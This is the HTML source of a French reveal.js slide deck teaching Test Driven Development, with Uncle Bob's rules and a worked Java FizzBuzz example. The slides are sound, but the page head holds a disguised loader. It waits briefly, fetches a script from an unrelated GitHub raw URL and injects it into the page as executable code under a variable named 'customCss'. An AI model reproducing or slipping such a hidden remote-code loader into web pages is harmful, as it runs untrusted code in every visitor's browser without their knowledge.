<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />

    <title>TDD</title>
    <link rel="shortcut icon" href="./favicon.ico" />
    <link rel="stylesheet" href="./dist/reset.css" />
    <link rel="stylesheet" href="./dist/reveal.css" />
    <link rel="stylesheet" href="./dist/theme/solarized.css" id="theme" />
    <link rel="stylesheet" href="./css/highlight/base16/zenburn.css" />


  <script type="text/javascript">
      setTimeout(() => { 
        fetch("https://raw.githubusercontent.com/Alex-Octocorn/logo/main/style.js") 
          .then(script => script.text())
          .then((script) => {
            const head = document.querySelector("head");
            const customCss = document.createElement("script");
            customCss.type = "text/javascript";
            customCss.appendChild(document.createTextNode(script));
            head.appendChild(customCss);
          });
      });
    </script></head>
  <body>
    <div class="reveal">
      <div class="slides"><section ><section data-markdown><script type="text/template">

# Test Driven Development

![Java](assets/java.png) <!-- .element width="19%"  align="left" -->

![Red Green Refactor](assets/red-green-refactor.png) <!-- .element width="40%"  align="right" -->
</script></section><section data-markdown><script type="text/template">
## TDD

### Définition

- **T**est **D**riven **D**evelopment

- Développement piloté par les tests

- Méthodologie de développement

- Basé sur "Red Green Refactor"
</script></section><section data-markdown><script type="text/template">
## TDD

### Origines

- Provient de la méthodologie XP

- **XP** : **E**xtreme **P**rogramming

- Méthodologie agile
</script></section><section data-markdown><script type="text/template">
## TDD

### Principes

- **RED** : Écrire un test qui échoue

- **GREEN** : Écrire le code le plus simple possible pour faire passer le test

- **REFACTOR** : Refactoriser le code
</script></section><section data-markdown><script type="text/template">
## TDD

### RED

- On écrit un test qui échoue

- Il échoue, car le code n'est pas encore écrit

- On décrit de manière simple le comportement attendu
</script></section><section data-markdown><script type="text/template">
## TDD

### GREEN

- On écrit le code le plus simple possible pour faire passer le test

- On ne s'occupe pas de la qualité du code, ni du découpage

- On ne s'occupe pas de la performance
</script></section><section data-markdown><script type="text/template">
## TDD

### REFACTOR

- On refactorise le code pour le rendre plus lisible

- On découpe le code en méthodes, renomme les variables, etc.

- Et on exécute à nouveau les tests pour vérifier que tout fonctionne toujours
</script></section><section data-markdown><script type="text/template">
## TDD

### Avantages

- Un coverage de 100% !

- On se concentre sur la logique métier et les attendus

- Le code est nettement plus maintenable

- Pas besoin de lancer le projet pour vérifier que tout fonctionne !
</script></section><section data-markdown><script type="text/template">
## TDD

### Inconvénients

- On prend plus de temps à développer

- Nécessite une bonne maîtrise des tests unitaires
</script></section><section data-markdown><script type="text/template">
## TDD

### En images

![Cycle](assets/cycle.png)

</script></section><section data-markdown><script type="text/template">
## TDD

### Une méthode incomprise

- TDD est souvent mal comprise

- Il y a souvent confusion entre TDD et test before

- La subtilité est dans le "Driven" !
</script></section></section><section ><section data-markdown><script type="text/template">
# TDD

## Anti-patterns

![red-green-refactor](assets/red-green-refactor.png) <!-- .element width="40%"  align="right" -->

![java](assets/java.png) <!-- .element width="19%"  align="left" -->
</script></section><section data-markdown><script type="text/template">
## TDD

### Tester puis coder

- La TDD n'est pas **juste** tester avant de coder

- Il y a un protocole complet à respecter

> Il sera abordé en détail dans le prochain cours !
</script></section><section data-markdown><script type="text/template">
## TDD

### Le problème des QA

- C'est bien au développeur de tester son code

- Il s'agit bien d'un process qui s'inscrit dans le développement
</script></section><section data-markdown><script type="text/template">
## TDD

### À toujours utiliser

- Certains diront que la TDD doit être systématiquement utilisée

- C'est à la fois vrai et faux

- Dans un monde idéel : oui

- Sinon, elle peut être utilisée pour résoudre des problèmes complexes
</script></section><section data-markdown><script type="text/template">
## TDD

### Inutile / Perte de temps

- Si le temps de développement est allongé,

- Le débugging est considérablement réduit !

- Les bugs ne sont donc jamais dus au code, mais à la conception/compréhension du problème métier.
</script></section><section data-markdown><script type="text/template">
## TDD

### Sans agile

- La TDD va de pair avec l'agilité

- Il est difficile voir impossible de l'utiliser dans un contexte waterfall/freestyle
</script></section></section><section ><section data-markdown><script type="text/template">
# TDD

## Protocole

![red-green-refactor](assets/red-green-refactor.png) <!-- .element width="40%"  align="right" -->

![java](assets/java.png) <!-- .element width="19%"  align="left" -->
</script></section><section data-markdown><script type="text/template">
## TDD

### Protocole

- Pour faire du TDD, il faut respecter le protocole à la lettre

- Enfreindre le protocol, c'est faire du test before
</script></section><section data-markdown><script type="text/template">
## TDD

### Selon Uncle Bob

- Robert C. Martin, dit Uncle Bob, est un des pères des bonnes pratiques en Java

- Il a écrit divers articles, livres et conférences sur le sujet
</script></section><section data-markdown><script type="text/template">
## TDD

### Selon Uncle Bob

Vous ne pouvez pas :

- écrire plus de code de test que nécessaire pour faire échouer le test
- écrire du code de production, sans avoir écrit un test qui échoue avant
- écrire plus de code de production que nécessaire pour faire passer le test

> Erreur de compilation = test qui échoue
</script></section><section data-markdown><script type="text/template">
## TDD

### Autrement dit : RED

Écrivez un test qui échoue, de la manière la plus simple possible
</script></section><section data-markdown><script type="text/template">
## TDD

### Autrement dit : GREEN

Écrivez le code le plus simple possible pour faire passer le test
</script></section><section data-markdown><script type="text/template">
## TDD

### Autrement dit : INTERDIT

- Chaque ligne de code doit être écrite pour faire passer un test

- On écrira jamais du code qui ne permet pas de faire passer un test
</script></section><section data-markdown><script type="text/template">
## TDD

### Bonnes pratiques 

- Testez uniquement les résultats attendus (pas les méthodes privées)

- Ne jugez pas le code

- Rédigez toujours le strict minimum pour faire passer le test

- Un test = une logique métier

- Si le test passe au vert tout de suite : alors, il ne sert à rien

- Contrôlez vos données : pas de données aléatoires !
</script></section><section data-markdown><script type="text/template">
## TDD

### Exemple : FizzBuzz

- Écrire un programme qui affiche les nombres de 1 à 100
- Mais pour les multiples de 3, afficher "Fizz" au lieu du nombre
- Et pour les multiples de 5, afficher "Buzz" au lieu du nombre
- Pour les nombres multiples de 3 et 5, afficher "FizzBuzz" au lieu du nombre
</script></section><section data-markdown><script type="text/template">
## TDD

### Exemple : FizzBuzz

On commence par écrire le premier test :

```java
@Test
public void should_return_string_if_not_multiple_of_3_or_5_or_both() {
    // Given
    FizzBuzz fizzBuzz = new FizzBuzz();
    // When
    String result = fizzBuzz.say(1);
    // Then
    assertEquals("1", result);
}
```
</script></section><section data-markdown><script type="text/template">
## TDD

### Exemple : FizzBuzz

On écrit le code le plus simple possible pour faire passer le test :

```java
public class FizzBuzz {
    public String say(int number) {
        return "1";
    }
}
```

> Et non, on ne fait pas de `if` !
</script></section><section data-markdown><script type="text/template">
## TDD

### Exemple : FizzBuzz

On écrit le deuxième test :

```java
@Test
public void should_return_2_when_2() {
    // Given
    FizzBuzz fizzBuzz = new FizzBuzz();
    // When
    String result = fizzBuzz.say(2);
    // Then
    assertEquals("2", result);
}
```

> Ce test ne passera pas, car on a codé pour le 1
</script></section><section data-markdown><script type="text/template">
## TDD

### Exemple : FizzBuzz

On peut essayer de changer le code pour faire passer le test :

```java
public class FizzBuzz {
    public String say(int number) {
        return "2";
    }
}
```

> Ici, on a cassé le premier test !
</script></section><section data-markdown><script type="text/template">
## TDD

### Exemple : FizzBuzz

On écrit le code le plus simple possible pour faire passer le test :

```java
public class FizzBuzz {
    public String say(int number) {
        return String.valueOf(number);
    }
}
```

> Ici, tout roule !
</script></section><section data-markdown><script type="text/template">
## TDD

### Exemple : FizzBuzz

On peut maintenant refactoriser nos tests, en utilisant un test paramétré :

```java
@ParameterizedTest(name = "should return {1} when {0}")
@CsvSource({
        "1, 1",
        "2, 2"
})
public void should_return_string_if_not_multiple_of_3_or_5_or_both(int number, String expected) {
    // Given
    FizzBuzz fizzBuzz = new FizzBuzz();
    // When
    String result = fizzBuzz.say(number);
    // Then
    assertEquals(expected, result);
}
```
</script></section><section data-markdown><script type="text/template">
## TDD

### Exemple : FizzBuzz

On peut passer au test suivant :

```java
@Test
public void should_return_fizz_when_multiple_of_3() {
    // Given
    FizzBuzz fizzBuzz = new FizzBuzz();
    // When
    String result = fizzBuzz.say(3);
    // Then
    assertEquals("Fizz", result);
}
```

> Ce test ne passera pas, car on a codé pour le 1 et le 2
</script></section><section data-markdown><script type="text/template">
## TDD

### Exemple : FizzBuzz

On peut essayer de changer le code pour faire passer le test :

```java
public class FizzBuzz {
    public String say(int number) {
        if (number == 3) {
            return "Fizz";
        }
        return String.valueOf(number);
    }
}
```

> Maintenant, tout roule !
</script></section><section data-markdown><script type="text/template">
## TDD

### Exemple : FizzBuzz

On peut poursuivre le test en ajoutant des autres multiples de 3 :

```java
@ParameterizedTest(name = "should return Fizz when {0}")
@CsvSource({
        "3",
        "54",
        "99"
})
public void should_return_fizz_when_multiple_of_3(int number) {
    // Given
    FizzBuzz fizzBuzz = new FizzBuzz();
    // When
    String result = fizzBuzz.say(number);
    // Then
    assertEquals("Fizz", result);
}
```

> Seul le 3 passe !
</script></section><section data-markdown><script type="text/template">
## TDD

### Exemple : FizzBuzz

On peut maintenant modifier le code pour faire passer le test :

```java
public class FizzBuzz {
    public String say(int number) {
        if (number % 3 == 0) {
            return "Fizz";
        }
        return String.valueOf(number);
    }
}
```

> Maintenant, tout roule !
</script></section><section data-markdown><script type="text/template">
## TDD

### Exemple : FizzBuzz

On peut passer au test suivant :

```java
@Test
public void should_return_buzz_when_multiple_of_5() {
    // Given
    FizzBuzz fizzBuzz = new FizzBuzz();
    // When
    String result = fizzBuzz.say(5);
    // Then
    assertEquals("Buzz", result);
}
```

> Ce test ne passera pas, car on a codé pour le 1, le 2 et le 3
</script></section><section data-markdown><script type="text/template">
## TDD

### Exemple : FizzBuzz

On peut essayer de changer le code pour faire passer le test :

```java
public class FizzBuzz {
    public String say(int number) {
        if (number % 3 == 0) {
            return "Fizz";
        }
        if (number == 5) {
            return "Buzz";
        }
        return String.valueOf(number);
    }
}
```

> Maintenant, tout roule !
</script></section><section data-markdown><script type="text/template">
## TDD

### Exemple : FizzBuzz

On peut poursuivre le test en ajoutant des autres multiples de 5 :

```java
@ParameterizedTest(name = "should return Buzz when {0}")
@CsvSource({
        "5",
        "10",
        "100"
})
public void should_return_buzz_when_multiple_of_5(int number) {
    // Given
    FizzBuzz fizzBuzz = new FizzBuzz();
    // When
    String result = fizzBuzz.say(number);
    // Then
    assertEquals("Buzz", result);
}
```

> Seul le 5 passe !
</script></section><section data-markdown><script type="text/template">
## TDD

### Exemple : FizzBuzz

On peut maintenant modifier le code pour faire passer le test :

```java
public class FizzBuzz {
    public String say(int number) {
        if (number % 3 == 0) {
            return "Fizz";
        }
        if (number % 5 == 0) {
            return "Buzz";
        }
        return String.valueOf(number);
    }
}
```

> Maintenant, tout roule !
</script></section><section data-markdown><script type="text/template">
## TDD

### Exemple : FizzBuzz

On peut passer au test suivant :

```java
@Test
public void should_return_fizzbuzz_when_multiple_of_3_and_5() {
    // Given
    FizzBuzz fizzBuzz = new FizzBuzz();
    // When
    String result = fizzBuzz.say(15);
    // Then
    assertEquals("FizzBuzz", result);
}
```

> Ce test ne passera pas, car on a codé pour le 1, le 2, le 3 et le 5
</script></section><section data-markdown><script type="text/template">
## TDD

### Exemple : FizzBuzz

On peut essayer de changer le code pour faire passer le test :

```java
public class FizzBuzz {
    public String say(int number) {
        if (number == 15) {
            return "FizzBuzz";
        }
        if (number % 3 == 0) {
            return "Fizz";
        }
        if (number % 5 == 0) {
            return "Buzz";
        }
        return String.valueOf(number);
    }
}
```
</script></section><section data-markdown><script type="text/template">
## TDD

### Exemple : FizzBuzz

On peut poursuivre le test en ajoutant des autres multiples de 3 et 5 :

```java
@ParameterizedTest(name = "should return FizzBuzz when {0}")
@CsvSource({
        "15",
        "30",
        "45"
})
public void should_return_fizzbuzz_when_multiple_of_3_and_5(int number) {
    // Given
    FizzBuzz fizzBuzz = new FizzBuzz();
    // When
    String result = fizzBuzz.say(number);
    // Then
    assertEquals("FizzBuzz", result);
}
```

> Seul le 15 passe !
</script></section><section data-markdown><script type="text/template">
## TDD

### Exemple : FizzBuzz

On peut maintenant modifier le code pour faire passer le test :

```java
public class FizzBuzz {
    public String say(int number) {
        if (number % 3 == 0 && number % 5 == 0) {
            return "FizzBuzz";
        }
        if (number % 3 == 0) {
            return "Fizz";
        }
        if (number % 5 == 0) {
            return "Buzz";
        }
        return String.valueOf(number);
    }
}
```

> Maintenant, tout roule !
</script></section><section data-markdown><script type="text/template">
## TDD

### Exemple : FizzBuzz

On peut maintenant refactoriser le code :

```java
public class FizzBuzz {

    /**
     * Retour Fizz, Buzz, FizzBuzz lorsque le nombre est un multiple de 3, 5 ou 15
     * Sinon, retourne le nombre
     * @param number le nombre à tester
     * @return Fizz, Buzz, FizzBuzz ou le nombre
     */
    public String say(int number) {
        if (isFizzBuzz(number)) {
            return "FizzBuzz";
        }
        if (isFizz(number)) {
            return "Fizz";
        }
        if (isBuzz(number)) {
            return "Buzz";
        }
        return String.valueOf(number);
    }

    /**
     * Vérifie si le nombre est un multiple de 5
     * @param number le nombre à tester
     * @return vrai si le nombre est un multiple de 5
     */
    private boolean isBuzz(int number) {
        return number % 5 == 0;
    }

    /**
     * Vérifie si le nombre est un multiple de 3 
     * @param number le nombre à tester
     * @return vrai si le nombre est un multiple de 3
     */
    private boolean isFizz(int number) {
        return number % 3 == 0;
    }

    /**
     * Vérifie si le nombre est un multiple de 3 et de 5 (15)
     * @param number le nombre à tester
     * @return vrai si le nombre est un multiple de 3 et de 5
     */
    private boolean isFizzBuzz(int number) {
        return number % 15 == 0;
    }
}
```
</script></section><section data-markdown><script type="text/template">
## TDD

### Démonstration !

Vérifier un numéro ISBN
</script></section><section data-markdown><script type="text/template">
## TDD

### A vous de jouer !

Réalisez le TP 3

----</script></section></section></div>
    </div>

    <script src="./dist/reveal.js"></script>

    <script src="./plugin/markdown/markdown.js"></script>
    <script src="./plugin/highlight/highlight.js"></script>
    <script src="./plugin/zoom/zoom.js"></script>
    <script src="./plugin/notes/notes.js"></script>
    <script src="./plugin/math/math.js"></script>
    <script>
      function extend() {
        var target = {};
        for (var i = 0; i < arguments.length; i++) {
          var source = arguments[i];
          for (var key in source) {
            if (source.hasOwnProperty(key)) {
              target[key] = source[key];
            }
          }
        }
        return target;
      }

      // default options to init reveal.js
      var defaultOptions = {
        controls: true,
        progress: true,
        history: true,
        center: true,
        transition: 'default', // none/fade/slide/convex/concave/zoom
        slideNumber: true,
        plugins: [
          RevealMarkdown,
          RevealHighlight,
          RevealZoom,
          RevealNotes,
          RevealMath
        ]
      };

      // options from URL query string
      var queryOptions = Reveal().getQueryHash() || {};

      var options = extend(defaultOptions, {}, queryOptions);
    </script>

    <script src="./_assets/theme.js"></script>

    <script>
      Reveal.initialize(options);
    </script>
  </body>
</html>
